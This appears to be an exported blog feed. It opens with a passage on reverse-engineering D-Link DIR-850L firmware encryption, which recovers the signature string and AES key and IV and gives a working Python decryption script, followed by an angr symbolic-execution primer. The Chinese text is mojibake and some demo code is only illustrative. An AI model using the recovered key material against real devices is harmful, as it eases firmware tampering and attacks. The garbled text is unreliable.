<h1 id="0x02-è§£å¯†é€»è¾‘åˆ†æ"><a href="#0x02-è§£å¯†é€»è¾‘åˆ†æ" class="headerlink" title="0x02 è§£å¯†é€»è¾‘åˆ†æ"></a>0x02 è§£å¯†é€»è¾‘åˆ†æ</h1><h3 id="è¢«ä¼ å…¥çš„å‚æ•°"><a href="#è¢«ä¼ å…¥çš„å‚æ•°" class="headerlink" title="è¢«ä¼ å…¥çš„å‚æ•°"></a>è¢«ä¼ å…¥çš„å‚æ•°</h3><p>æˆ‘ä»¬æŸ¥çœ‹ encrypt_main å‡½æ•°çš„å¼•ç”¨ï¼Œå¯ä»¥åœ¨ sub_407664+668 å¤„æ‰¾åˆ°ä¸€å¤„è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯6ï¼Œç¬¬äºŒä¸ªå‚æ•°è¢«èµ‹å€¼äº†å¾ˆå¤šç±»ä¼¼äº-iï¼Œ-dä¹‹ç±»çš„ä¸œè¥¿ï¼Œç»“åˆ encrypt_main å‡½æ•°æ˜¯ä¸ª mainï¼Œæˆ‘ä»¬çŒœæµ‹ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ argcï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯argv</p>
<p>ä½†æ˜¯è¿™é‡Œçš„èµ‹å€¼æ–¹å¼å¾ˆå¥‡æ€ªï¼Œv116 æ˜¯<code>struct stat</code>ï¼Œæ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œæˆ‘ä»¬å†å»åˆ«çš„å¼•ç”¨å¤„çœ‹ä¸€ä¸‹ï¼Œå¯ä»¥åœ¨ encode_file_check å‡½æ•°ä¸­å‘ç°è¿™äº›å‚æ•°å…¶å®æ˜¯ä¸€ä¸ª char æ•°ç»„ï¼Œè¿™å°±ç¬¦åˆæˆ‘ä»¬å¯¹ argv çš„è®¤çŸ¥äº†ã€‚</p>
<p>æˆ‘ä»¬æŒ‰ y é”®å°† sub_407664 ä¸­çš„ v116 çš„æ•°æ®ç±»å‹ä¿®æ”¹æˆ char* å³å¯</p>
<p><img src="https://i0.imgs.ovh/2023/11/09/l1iQJ.png" alt="l1iQJ.png"></p>
<p>æ¥ä¸‹æ¥åˆ†æ argv éƒ½æ˜¯äº›ä»€ä¹ˆä¸œè¥¿  </p>
<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°: encimg</li>
<li>ç¬¬äºŒä¸ªå‚æ•°: -i (å°† v116 æ•°æ®ç±»å‹ä¿®æ”¹åï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°â€-iâ€æ˜¯ v117ï¼Œè€Œå…¨å±€å˜é‡ ptr æ‰æ˜¯ v118)</li>
<li>ç¬¬ä¸‰ä¸ªå‚æ•°: ptr(åœ¨ encode_file_check å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œptr ä¸ â€œ/var/firmware.seamaâ€ ä½œäº†æ¯”è¾ƒï¼Œå› æ­¤æˆ‘ä»¬çŒœæµ‹ptrå¯èƒ½æ˜¯æŒ‡å‘æ–‡ä»¶åå­—ç¬¦ä¸²çš„æŒ‡é’ˆ)</li>
<li>ç¬¬å››ä¸ªå‚æ•°: -s</li>
<li>ç¬¬äº”ä¸ªå‚æ•°: byte_43CDB0(åœ¨ encode_file_check å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œbyte_43CDB0 æ˜¯ä» <code>/etc/config/image_sign</code> æ–‡ä»¶è¯»å‡ºäº†128ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°é‡Œé¢æ˜¯<code>wrgac25_dlink.2013gui_dir850l</code>)</li>
<li>ç¬¬å…­ä¸ªå‚æ•°: -d</li>
</ul>
<p>å› æ­¤ï¼Œæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ˜¯<code>encimg -i file -s wrgac25_dlink.2013gui_dir850l -d</code></p>
<p>è¿™ä¹Ÿç¬¦åˆ argc = 6 çš„è¦æ±‚</p>
<h3 id="å‚æ•°åŠŸèƒ½"><a href="#å‚æ•°åŠŸèƒ½" class="headerlink" title="å‚æ•°åŠŸèƒ½"></a>å‚æ•°åŠŸèƒ½</h3><p>æˆ‘ä»¬çŸ¥é“ï¼Œä¸€èˆ¬æ¥è¯´ -h ä»£è¡¨çš„æ˜¯ helpï¼Œæ‰€ä»¥æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ encrypt_main å‡½æ•°çš„<code>case h:</code>ä¼šæ‰“å°ä»€ä¹ˆä¸œè¥¿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sub_408F8C()</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;Usage: %s &#123;OPTIONS&#125;\n&quot;, &quot;encimg&quot;);</span><br><span class="line">  puts(&quot;   -h                      : show this message.&quot;);</span><br><span class="line">  puts(&quot;   -v                      : Verbose mode.&quot;);</span><br><span class="line">  puts(&quot;   -i &#123;input image file&#125;   : input image file.&quot;);</span><br><span class="line">  puts(&quot;   -e                      : encode file.&quot;);</span><br><span class="line">  puts(&quot;   -d                      : decode file.&quot;);</span><br><span class="line">  return puts(&quot;   -s                      : signature.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è€Œç»è¿‡ switch-case åï¼Œåœ¨ Line57 åˆ¤æ–­ dword_43CE40 ä¹Ÿå°±æ˜¯ signature æ˜¯å¦å­˜åœ¨ï¼Œè¿™ä¸ªæ˜¯ -s å‚æ•°åšçš„äº‹æƒ…ï¼Œè€Œåœ¨ Line59 å¤„åˆ¤æ–­ file æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœä¸¤ä¸ªéƒ½é€šè¿‡ï¼Œå°±ä¼šè°ƒç”¨ sub_4090E0 å‡½æ•°ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›</p>
<p><img src="https://i0.imgs.ovh/2023/11/09/l1qvD.png" alt="l1qvD.png"></p>
<p>åœ¨ sub_4090E0 å‡½æ•°çš„å‰ä¸€éƒ¨åˆ†ä¸­ï¼Œåšäº†æ–‡ä»¶æ ¡éªŒç­‰ä¸æ˜¯å¾ˆé‡è¦çš„æ“ä½œï¼Œè€Œé‡è¦çš„è§£å¯†æ“ä½œä» <strong>Line108</strong> å¼€å§‹ï¼Œä¹Ÿå°±æ˜¯ä¸‹å›¾ä½ç½®ï¼Œæˆ‘å·²ç»åŠ å¥½æ³¨é‡Šäº†</p>
<p><img src="https://i0.imgs.ovh/2023/11/09/lJCoX.png" alt="lJCoX.png"></p>
<p>Line130-Line137 æ˜¯è®¾ç½®AESåŠ è§£å¯†å¯†é’¥<code>user_key</code>ï¼Œè€Œ Line108-Line129 æ˜¯ç”¨<code>_____progs_board_fw_sign_data</code>åˆå§‹åŒ–<code>user_key</code>ï¼Œæ¥ç€ç”¨ encrypt å‡½æ•°å¯¹<code>user_key</code>åšä¸€äº›å¤„ç†ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ encrypt å‡½æ•°</p>
<p><img src="https://i0.imgs.ovh/2023/11/09/lJP5U.png" alt="lJP5U.png"></p>
<p>è€Œè®¾ç½®å¥½å¯†é’¥ä»¥åï¼ŒLine158 å¤„è°ƒç”¨ AES_cbc_encrypt å‡½æ•°(å¦‚ä¸‹å›¾)ï¼Œä½†æˆ‘ä»¬é€šè¿‡<a href="https://blog.csdn.net/duanxingheng/article/details/11730617">OpenSSL-AES</a>è¿™ç¯‡æ–‡ç« çŸ¥é“ï¼ŒAES ä¸å¯èƒ½åªæœ‰è¿™ä¹ˆç‚¹å‚æ•°ï¼Œå¹¶ä¸”æ ¹æ®åˆ†æï¼Œ v32 å’Œ mmap_file_ptr éƒ½æ˜¯ mmap_file ï¼Œè¿™è‚¯å®šä¸å¯¹ã€‚</p>
<p><img src="https://i0.imgs.ovh/2023/11/09/lJLr0.png" alt="lJLr0.png"></p>
<p>æ‰€ä»¥æˆ‘ä»¬æŒ‰ y é”®ï¼Œå°†<code>AES_cbc_encrypt</code>ä¿®æ”¹ä¸º<code>void AES_cbc_encrypt(const unsigned char *in, unsigned char *out,   size_t length, const AES_KEY *key,    unsigned char *ivec, const int enc);</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inï¼š éœ€è¦åŠ å¯†/è§£å¯†çš„æ•°æ®ï¼›</span><br><span class="line"></span><br><span class="line">outï¼š è®¡ç®—åè¾“å‡ºçš„æ•°æ®ï¼›</span><br><span class="line"></span><br><span class="line">lengthï¼š æ•°æ®é•¿åº¦ï¼ˆè¿™é‡Œä¸åŒ…å«åˆå§‹å‘é‡æ•°æ®é•¿åº¦ï¼‰</span><br><span class="line"></span><br><span class="line">keyï¼šå¯†é’¥</span><br><span class="line"></span><br><span class="line">ivecï¼š åˆå§‹å‘é‡ï¼ˆä¸€èˆ¬ä¸º16å­—èŠ‚å…¨0ï¼‰</span><br><span class="line"></span><br><span class="line">encï¼š AES_ENCRYPT(1) ä»£è¡¨åŠ å¯†ï¼Œ AES_DECRYPT(0) ä»£è¡¨è§£å¯†ï¼›</span><br></pre></td></tr></table></figure>
<p><img src="https://i0.imgs.ovh/2023/11/09/lJXIC.png" alt="lJXIC.png"></p>
<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼ŒLine131-Line177 å°±æ˜¯å¾ˆæ ‡å‡†çš„ä¸€ä¸ª AES åŠ è§£å¯†</p>
<h1 id="è§£å¯†è„šæœ¬"><a href="#è§£å¯†è„šæœ¬" class="headerlink" title="è§£å¯†è„šæœ¬"></a>è§£å¯†è„šæœ¬</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">def aes_decrypt_file(key,iv,input_file,output_file):</span><br><span class="line">    cipher = AES.new(bytes(key),AES.MODE_CBC,bytes(iv))</span><br><span class="line">    with open(input_file,&#x27;rb&#x27;) as infile, open(output_file,&#x27;wb&#x27;) as outfile:</span><br><span class="line">        while True:</span><br><span class="line">            chunk = infile.read(16)</span><br><span class="line">            if len(chunk) == 0:</span><br><span class="line">                break</span><br><span class="line">            elif len(chunk) % 16 != 0:</span><br><span class="line">                raise ValueError(&quot;aes error&quot;)</span><br><span class="line">            decrypted_chunk = cipher.decrypt(chunk)</span><br><span class="line">            outfile.write(decrypted_chunk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">______progs_board_fw_sign_data =[0x6B, 0x35, 0x4E, 0x49, 0x31, 0x2B, 0x62, 0x76, 0x57, 0x45, </span><br><span class="line">  0x66, 0x5A, 0x36, 0x6F, 0x68, 0x74, 0x70, 0x55, 0x4F, 0x77, </span><br><span class="line">  0x79, 0x6E, 0x4F, 0x64, 0x55, 0x63, 0x69, 0x76, 0x71, 0x77, </span><br><span class="line">  0x45, 0x5A, 0x71, 0x51, 0x65, 0x68, 0x48, 0x4D, 0x45, 0x6D, </span><br><span class="line">  0x45, 0x50, 0x51, 0x35, 0x69, 0x7A, 0x4C, 0x2B, 0x63, 0x61, </span><br><span class="line">  0x62, 0x6E, 0x38, 0x62, 0x4E, 0x48, 0x5A, 0x58, 0x48, 0x6A, </span><br><span class="line">  0x6B, 0x70, 0x36, 0x57, 0x43, 0x6C, 0x39, 0x79, 0x6E, 0x39, </span><br><span class="line">  0x43, 0x49, 0x6B, 0x69, 0x49, 0x31, 0x0A, 0x6D, 0x54, 0x46, </span><br><span class="line">  0x75, 0x32, 0x31, 0x54, 0x45, 0x45, 0x50, 0x6F, 0x36, 0x36, </span><br><span class="line">  0x4A, 0x42, 0x46, 0x76, 0x39, 0x42, 0x4D, 0x6D, 0x62, 0x2B, </span><br><span class="line">  0x49, 0x4B, 0x51, 0x67, 0x6E, 0x4F, 0x38, 0x4F, 0x75, 0x46, </span><br><span class="line">  0x34, 0x62, 0x7A, 0x34, 0x66, 0x72, 0x47, 0x50, 0x64, 0x4E, </span><br><span class="line">  0x36, 0x37, 0x67, 0x59, 0x4C, 0x75, 0x4F, 0x73]</span><br><span class="line"></span><br><span class="line">def dec_val_by_sig(dec_sig_val,dec_len,sig): # encrypt å‡½æ•° pythonè¡¨ç¤º</span><br><span class="line">    sig_len = len(sig)</span><br><span class="line">    loop_sig_idx = 0</span><br><span class="line">    loop_dec_idx = 1</span><br><span class="line">    idx = 0</span><br><span class="line">    while True:</span><br><span class="line">        cur_sig = sig[loop_sig_idx]</span><br><span class="line">        loop_sig_idx+=1</span><br><span class="line">        if(idx&gt;=dec_len):</span><br><span class="line">            break</span><br><span class="line">        if(loop_sig_idx&gt;=sig_len):</span><br><span class="line">            loop_sig_idx=0</span><br><span class="line"></span><br><span class="line">        dec_sig_val[idx] = loop_dec_idx ^ dec_sig_val[idx] ^ ord(cur_sig)</span><br><span class="line">        loop_dec_idx+=1</span><br><span class="line">        idx+=1</span><br><span class="line">        if loop_dec_idx &gt;= 252:</span><br><span class="line">            loop_dec_idx = 1</span><br><span class="line"></span><br><span class="line">aes_key = []</span><br><span class="line"></span><br><span class="line">for i in range(0,32):</span><br><span class="line">    aes_key.append(______progs_board_fw_sign_data[i+32])</span><br><span class="line"></span><br><span class="line">iv = []</span><br><span class="line"></span><br><span class="line">for i in range(0,16):</span><br><span class="line">    iv.append(______progs_board_fw_sign_data[i+96])</span><br><span class="line"></span><br><span class="line">print(&#x27;iv before dec: &#x27;,iv)</span><br><span class="line">print(&#x27;aes_key before dec: &#x27;,aes_key)</span><br><span class="line">dec_val_by_sig(iv,16,&#x27;wrgac25_dlink.2013gui_dir850l&#x27;)</span><br><span class="line">dec_val_by_sig(aes_key,32,&#x27;wrgac25_dlink.2013gui_dir850l&#x27;)</span><br><span class="line">print(&#x27;iv before dec: &#x27;,iv)</span><br><span class="line">print(&#x27;aes_key before dec: &#x27;,aes_key)</span><br><span class="line"></span><br><span class="line">aes_decrypt_file(aes_key,iv,&#x27;/mnt/e/EdgeDownload/IOT/DIR850LB1_FW220WWb03.bin&#x27;,&#x27;out.bin&#x27;)</span><br></pre></td></tr></table></figure>
<p>è§£å¯†åå³å¯è§£åŒ…</p>
<p><img src="https://i0.imgs.ovh/2023/11/09/lJZRR.png" alt="lJZRR.png"></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>Mips</tag>
        <tag>Wifi</tag>
      </tags>
  </entry>
  <entry>
    <title>Symbolic Execution Leaning Note (2) -- Angr_2023</title>
    <url>/2023/10/20/blog13/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
è¿ˆå‘è‡ªåŠ¨åŒ–çš„ç¬¬äºŒæ­¥â€”â€”  
</blockquote>

<span id="more"></span>
<h1 id="0xFF-Reference"><a href="#0xFF-Reference" class="headerlink" title="0xFF Reference"></a>0xFF Reference</h1><p><a href="https://heygap.github.io/2023/09/30/blog9/#more">1. Symbolic Execution Leaning Note (1) â€” Basis</a><br><a href="https://xz.aliyun.com/t/7117#toc-22">2. 2020å¹´Angr-Apiéå®˜æ–¹ä»‹ç»</a><br><a href="https://github.com/jakespringer/angr_ctf/blob/master/SymbolicExecution.pptx">3. angr_ctfé‡Œä»‹ç»angrçš„ppt(è®²çš„çœŸçš„æŒºå¥½çš„)</a></p>
<h1 id="0x00-Recall-Symbolic-Execution"><a href="#0x00-Recall-Symbolic-Execution" class="headerlink" title="0x00 Recall-Symbolic Execution"></a>0x00 Recall-Symbolic Execution</h1><p>ç¬”è€…æ°´å¹³æœ‰é™ï¼Œå¦‚æœ‰é”™è¯¯è¯·æŒ‡å‡º ;-)</p>
<p>æˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹ä»€ä¹ˆæ˜¯ç¬¦å·æ‰§è¡Œï¼š<br>æˆ‘ä»¬åœ¨é€†å‘ä¸€ä¸ªç¨‹åºã€å»æ‰¾ä¸€ä¸ªç¨‹åºçš„æ¼æ´æ—¶ï¼Œæˆ‘ä»¬ä¼šå¸Œæœ›æ‰¾åˆ°ä¸€ä¸ª<code>input</code>,æ¥è§¦å‘æˆ‘ä»¬éœ€è¦çš„æ¼æ´æˆ–è€…æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„flagï¼Œè€Œç¬¦å·æ‰§è¡Œçš„åŠŸèƒ½å°±æ˜¯<strong>é€šè¿‡éå†ç¨‹åºæ‰€æœ‰å¯èƒ½çš„â€œçŠ¶æ€(State)â€ï¼Œæ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„Stateï¼Œè¿›è€Œé€šè¿‡çº¦æŸæ±‚è§£å™¨ï¼Œæ±‚è§£å‡ºæˆ‘ä»¬æœ€åéœ€è¦çš„input</strong></p>
<p>å®è§‚ä¸Šçœ‹ï¼Œç¬¦å·æ‰§è¡Œå¯ä»¥åˆ†ä¸º<code>ä¸‰æ­¥</code>  </p>
<ol>
<li>æ³¨å…¥ç¬¦å·</li>
<li>åˆ†æ”¯</li>
<li>æ‰§è¡Œåˆ†æ”¯  </li>
</ol>
<p>æˆ‘ä»¬ç”¨ä¸€ä¸ªç®€å•çš„å‡½æ•°æ¥åˆ†åˆ«çœ‹ä¸€ä¸‹è¿™ä¸‰æ­¥æ˜¯ä»€ä¹ˆ<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// demo func</span><br><span class="line"></span><br><span class="line">Line1  void check_func(char* passwd)</span><br><span class="line">Line2  &#123;</span><br><span class="line">Line3      if(passwd == &quot;HeyGap&quot;)</span><br><span class="line">Line4          printf(&quot;Access granted&quot;);</span><br><span class="line">Line5      else</span><br><span class="line">Line6          printf(&quot;Access denied&quot;);</span><br><span class="line">Line7  &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="1-æ³¨å…¥ç¬¦å·-Inject-Symbols"><a href="#1-æ³¨å…¥ç¬¦å·-Inject-Symbols" class="headerlink" title="1. æ³¨å…¥ç¬¦å·(Inject Symbols)"></a>1. æ³¨å…¥ç¬¦å·(Inject Symbols)</h3><ul>
<li>ä»€ä¹ˆæ˜¯æ³¨å…¥ç¬¦å·ï¼Ÿ<br>æˆ‘ä»¬åœ¨<code>å…·ä½“æ‰§è¡Œ</code>çš„æ—¶å€™ï¼Œä¼ å…¥çš„passwdæ˜¯ä¸€ä¸ªå…·ä½“çš„å­—ç¬¦ä¸²ï¼›å¯æˆ‘ä»¬åœ¨<code>ç¬¦å·æ‰§è¡Œ</code>æ—¶ï¼Œä¼ å…¥çš„æ˜¯ä¸€ä¸ª<code>ç¬¦å·</code>ã€‚ </li>
<li>ä»€ä¹ˆæ˜¯ç¬¦å·ï¼Ÿ<br>ç±»æ¯”äºæˆ‘ä»¬å°å­¦å­¦çš„æ–¹ç¨‹<code>x + 1 = 2</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™æ ·ä¸€ä¸ªæ–¹ç¨‹æ¥æ±‚è§£å‡ºå˜é‡xï¼Œæˆ‘ä»¬ä¹Ÿç§°â€œè¿™ä¸ªæ–¹ç¨‹çº¦æŸäº†è¿™ä¸ªå˜é‡xâ€ï¼›è€Œ<code>ç¬¦å·</code>å°±æ˜¯æ–¹ç¨‹ä¸­çš„<code>å˜é‡</code>ï¼Œç”¨æ¥çº¦æŸç¬¦å·çš„<code>æ‰§è¡Œè·¯å¾„</code>å°±å¯ä»¥ç±»æ¯”æˆ<code>æ–¹ç¨‹</code></li>
<li>ä»€ä¹ˆæ˜¯æ‰§è¡Œè·¯å¾„ï¼Ÿ<br>ä»State_Aåˆ°State_Bçš„<code>æ‰§è¡Œè·¯å¾„</code>å°±æ˜¯<strong>ä»èµ·ç‚¹Aå¯ä»¥æ‰§è¡Œåˆ°ç»ˆç‚¹Bçš„ä¸€æ¡æŒ‡ä»¤(instructions)è·¯å¾„</strong>,åœ¨æ¯æ¡æ‰§è¡Œè·¯å¾„ä¸­éƒ½ä¼šç»´æŠ¤ä¸€ä¸ªç¬¦å·å˜é‡<code>pc</code>ï¼Œpcè®°å½•äº†â€œä»Aç‚¹å‡ºå‘ï¼Œè¦åˆ°è¾¾Bçš„å…¨éƒ¨æ¡ä»¶â€ï¼Œè¿™ä¸ªç¬¦å·å˜é‡çš„ç±»å‹æ˜¯é€»è¾‘è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªç¬¦å·å˜é‡æ‰”åˆ°SMTæ±‚è§£å™¨ï¼ˆæ¯”å¦‚z3ï¼‰ä¸­å»æ±‚è§£æ»¡è¶³è¿™ä¸ªç¬¦å·å˜é‡ä¸­æ‰€æœ‰çº¦æŸæ¡ä»¶çš„1~nä¸ªè§£</li>
<li>Example<br>åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ä¸€ä¸ªç¬¦å·ä¼ å…¥passwdä¸­ï¼Œå°±æ˜¯æ³¨å…¥ç¬¦å·ã€‚</li>
</ul>
<h3 id="2-åˆ†æ”¯-Branching"><a href="#2-åˆ†æ”¯-Branching" class="headerlink" title="2. åˆ†æ”¯(Branching)"></a>2. åˆ†æ”¯(Branching)</h3><ul>
<li>ä»€ä¹ˆæ˜¯branching<br>ç”±äºæˆ‘ä»¬çš„ç¬¦å·æ˜¯ä¸€ä¸ªå¾…ç¡®å®šçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨é‡åˆ°<code>åˆ¤æ–­è¯­å¥</code>æ—¶ï¼Œå½“å‰çš„Stateä¼šè®¾ç½®ä¸ºæ‰§è¡Œå®Œæ¯•(already executed)ï¼Œç„¶åæ¿€æ´»(active)ä¸¤ä¸ªæ–°çš„stateï¼Œç”±äºè¦éå†å…¨éƒ¨stateï¼Œç¬¦å·åœ¨åˆ¤æ–­è¯­å¥ä¸­å¾—åˆ°ä¸åŒè¿”å›å€¼ï¼Œè€Œè¿™ä¸¤ä¸ªstateå°±æ˜¯ä¸åŒè¿”å›å€¼è¿›å…¥çš„ä¸åŒåˆ†æ”¯çš„èµ·å§‹çŠ¶æ€</li>
<li>Example<br>åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œå¯ä»¥ç†è§£ä¸ºLine1-2ä¸ºstate1ï¼Œå½“æ‰§è¡Œåˆ°Line3æ—¶ï¼Œstate1è®¾ç½®ä¸ºæ‰§è¡Œå®Œæ¯•ï¼ŒåŒæ—¶æ¿€æ´»state2å’Œstate3ï¼Œstate2ä¸ºLine4ï¼Œstate3ä¸ºLine6</li>
</ul>
<h3 id="3-è¯„ä¼°åˆ†æ”¯-Evaluate-Each-Branches"><a href="#3-è¯„ä¼°åˆ†æ”¯-Evaluate-Each-Branches" class="headerlink" title="3. è¯„ä¼°åˆ†æ”¯(Evaluate Each Branches)"></a>3. è¯„ä¼°åˆ†æ”¯(Evaluate Each Branches)</h3><ul>
<li>ä»€ä¹ˆæ˜¯Evaluate Branchesï¼Ÿ<br>æˆ‘ä»¬ä¼šè¯„ä¼°(Evaluate)æ¯ä¸€ä¸ªactiveçš„stateï¼Œåˆ¤æ–­ä»–ä»¬æ˜¯å¦ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚ï¼Œå¦‚æœä¸æ»¡è¶³å°±è®¾ç½®terminatedï¼Œå¦‚æœé‡åˆ°åˆ¤æ–­è¯­å¥å°±è¿›å…¥ç¬¬äºŒæ­¥</li>
<li>Example<br>å‡è®¾å½“å‰æ¿€æ´»çš„stateä¸º2å’Œ3ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦â€œæ ‡å‡†è¾“å‡ºä¸­åŒ…å«â€™grantedâ€™â€ï¼Œé‚£ç¬¦å·æ‰§è¡Œå™¨å°±ä¼šè¯„ä¼°state2ï¼Œå‘ç°è¿™ä¸ªstateç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ï¼Œäºæ˜¯å°†state2åŠ åˆ°foundæ•°ç»„ä¸­ï¼›ç„¶åå†è¯„ä¼°state3ï¼Œå‘ç°ä¸ç¬¦åˆï¼Œè®¾ç½®ä¸ºterminated</li>
</ul>
<h1 id="0x01-An-Introduction-to-Angr"><a href="#0x01-An-Introduction-to-Angr" class="headerlink" title="0x01 An Introduction to Angr"></a>0x01 An Introduction to Angr</h1><h3 id="1-å‡ºç°çš„class"><a href="#1-å‡ºç°çš„class" class="headerlink" title="1. å‡ºç°çš„class"></a>1. å‡ºç°çš„class</h3><p>ç¬”è€…åœ¨æ­¤è®°å½•ç›¸å¯¹é‡è¦çš„classï¼Œè¯»è€…å¯ä»¥é€šè¿‡é˜…è¯»æºç æˆ–å®˜æ–¹æ‰‹å†Œç­‰æ–¹å¼ï¼Œå…ˆå¼„æ¸…æ¥šè¿™äº›classçš„ä½œç”¨<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SimState</span><br><span class="line">Simulation Manager(simgr)</span><br></pre></td></tr></table></figure></p>
<h3 id="2-Symbolic-Execution-In-Angr"><a href="#2-Symbolic-Execution-In-Angr" class="headerlink" title="2. Symbolic Execution In Angr"></a>2. Symbolic Execution In Angr</h3><p>é€šè¿‡0x00ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨ç¬¦å·æ‰§è¡Œä¸­ï¼Œ<code>æ‰§è¡Œè·¯å¾„</code>å’Œ<code>ç¬¦å·</code>æ˜¯æœ€é‡è¦çš„ä¸¤ä¸ªä¸œè¥¿</p>
<ul>
<li><p>Angrä¸­çš„æ‰§è¡Œè·¯å¾„  </p>
<ol>
<li>æˆ‘ä»¬çŸ¥é“æ¯branchä¸€æ¬¡ï¼Œå°±ä¼šæ·»åŠ ä¸¤ä¸ªstateï¼Œè€Œåœ¨Angrä¸­ï¼Œç»´æŠ¤è·¯å¾„ä¿¡æ¯çš„pcç”±<code>SimState</code> Objectç»„æˆï¼ŒSimStateç”¨âˆ©é“¾åœ¨ä¸€èµ·å°±ç»„æˆäº†pc</li>
<li>ç”±äºæˆ‘ä»¬è¦éå†å…¨éƒ¨stateï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æœ‰ä¸€ä¸ªç®¡ç†å™¨æ¥ç®¡ç†å…¨éƒ¨æ‰§è¡Œè·¯å¾„(a Set of Path)ï¼Œè¿™ä¸ªç®¡ç†å™¨å°±æ˜¯<code>Simulation Manager (simgr)</code>,ä¸‹å›¾ä¸ºAngrä¸­ç”Ÿæˆå…¨éƒ¨è·¯å¾„çš„è¿‡ç¨‹<br><img src="/pic/1.png" alt=""></li>
<li>ä¸Šå›¾æåˆ°<code>until we find what we want</code>ï¼Œsimgræä¾›äº†å‡½æ•°<code>explore</code>ï¼Œå¯ä»¥è®©æˆ‘ä»¬é€šè¿‡ä¸¤ç§æ–¹å¼æ¥æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„state  <ol>
<li>é€šè¿‡æŒ‡ä»¤åœ¨textæ®µçš„åœ°å€</li>
<li>é€šè¿‡ä»»æ„ä½“ç°stateç‰¹å¾çš„å‡½æ•°</li>
</ol>
</li>
</ol>
</li>
<li><p>State Explosion  </p>
<ol>
<li>ä½†æ˜¯å•çº¯çš„éå†æ¯ä¸€æ¡è·¯å¾„ä¼šå­˜åœ¨çŠ¶æ€çˆ†ç‚¸(State Explosionï¼Œæœ‰äº›åœ°æ–¹ä¹Ÿå«è·¯å¾„çˆ†ç‚¸)çš„é—®é¢˜ï¼Œæ¥çœ‹ä¸‹é¢è¿™ä¸ªå¾ªç¯<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int xï¼›</span><br><span class="line">for(int 0;i&lt;100;i++)</span><br><span class="line">&#123;</span><br><span class="line">    if(x &gt; 10)</span><br><span class="line">      printf(&quot;Good&quot;);</span><br><span class="line">    else</span><br><span class="line">      printf(&quot;Wrong&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>å½“i=1æ—¶ï¼Œç®¡ç†å™¨ä¼šåˆ›å»ºä¸¤ä¸ªstateï¼Œè€Œi=2æ—¶ï¼Œå…ˆå‰çš„ä¸¤ä¸ªstateæœ‰åˆ†åˆ«ä¼šåˆ›å»ºä¸¤ä¸ªstateï¼Œå½“i=100æ—¶ï¼Œæˆ‘ä»¬å°±ä¼šå‡ºç°2^100ä¸ªstateï¼Œè¿™å°±æ˜¯çŠ¶æ€çˆ†ç‚¸é—®é¢˜</li>
<li>è€Œexploreä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå‚æ•°avoidï¼Œæ•ˆæœå°±æ˜¯<code>å‰ªæ</code>ï¼Œåœ¨exploreä¸­æ·»åŠ avoidå‚æ•°ä¼šå¸®åŠ©æˆ‘ä»¬æå‰terminateé‚£äº›æˆ‘ä»¬ä¸éœ€è¦çš„stateï¼Œå› æ­¤è¿™ä¸ªstateåç»­çš„branchå°±ä¸ä¼šå†è·Ÿè¿›</li>
</ol>
</li>
</ul>
<h1 id="0x02-My-Manual-for-Angr"><a href="#0x02-My-Manual-for-Angr" class="headerlink" title="0x02 My Manual for Angr"></a>0x02 My Manual for Angr</h1><p><a href=""></a></p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>Symbolic Execution Leaning Note (3) -- Angr_API</title>
    <url>/2023/10/20/blog14/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
è¿ˆå‘è‡ªåŠ¨åŒ–çš„ç¬¬ä¸‰æ­¥â€”â€”  
</blockquote>


<span id="more"></span>
